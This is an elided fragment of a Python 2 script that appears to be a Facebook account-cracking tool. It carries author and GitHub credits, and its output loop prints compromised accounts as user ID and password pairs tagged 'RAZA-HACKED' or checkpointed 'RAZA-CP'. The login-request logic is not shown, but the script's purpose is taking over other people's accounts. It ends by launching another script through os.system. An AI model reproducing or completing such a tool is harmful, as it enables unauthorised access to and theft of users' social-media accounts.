...
print("This Tool Is Free By Raza")
...
def menu():
    ...
    print 'Codder : Ali Raza XD'

    print 'Author : Ali Raza XD'

    print 'Facebook : Ali Raza XD'

    print 'Github : https://github.com/MahummadAyaanTricksz'
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[RAZA-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print '\x1b[1;93m[RAZA-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[(MAMUN)Open After 03 Days]\x1b[0m \n'
    ...
    os.system('python2 BangladeshCity.py')
